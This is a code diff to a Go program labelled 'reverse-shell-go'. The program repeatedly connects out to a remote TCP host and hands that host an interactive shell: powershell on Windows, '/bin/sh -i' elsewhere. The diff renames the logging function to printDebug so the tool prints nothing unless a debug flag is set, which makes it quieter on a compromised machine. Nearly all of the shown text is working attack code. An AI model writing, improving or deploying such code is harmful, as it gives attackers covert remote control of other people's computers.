@@ -19,9 +19,9 @@ const debug = false
 
 func main() {
 	if debug {
-		Println("starting in debug mode")
+		printDebug("starting in debug mode")
 	}
-	Println("github.com/orf1/reverse-shell-go")
+	printDebug("github.com/orf1/reverse-shell-go")
 	for {
 		time.Sleep(delay * time.Second)
 		connect()
@@ -31,13 +31,13 @@ func main() {
 // connect attempts to send a shell to a remote server
 func connect() {
 	// attempts to establish a tcp connection with server
-	Println("attempting to establish tcp connection with server")
+	printDebug("attempting to establish tcp connection with server")
 	con, err := net.Dial("tcp", host)
 	if err != nil {
-		Println(err.Error())
+		printDebug(err.Error())
 		return
 	}
-	Println("connection established")
+	printDebug("connection established")
 
 	cmd := getOsCmd()
 
@@ -48,27 +48,29 @@ func connect() {
 	cmd.Stderr = con
 
 	// opens shell
-	Println("shell opened")
+	printDebug("shell opened")
 	err = cmd.Run()
 	if err != nil {
-		Println(err.Error())
+		printDebug(err.Error())
 		return
 	}
-	Println("shell closed")
+	printDebug("shell closed")
 }
 
+// detects running os and returns appropriate shell
 func getOsCmd() *exec.Cmd {
-	Println("detecting operating system")
+	printDebug("detecting operating system")
 	if runtime.GOOS == "windows" {
-		Println("detected windows, using powershell")
+		printDebug("detected windows, using powershell")
 		return exec.Command("powershell")
 	} else {
-		Println("detected mac or linux, using /bin/sh")
+		printDebug("detected mac or linux, using /b in/sh")
 		return exec.Command("/bin/sh", "-i")
 	}
 }
 
-func Println(text string) {
+// replaces fmt.Println with a function that checks if debug mode is on
+func printDebug(text string) {
 	if debug {
 		fmt.Println(text)
 	}
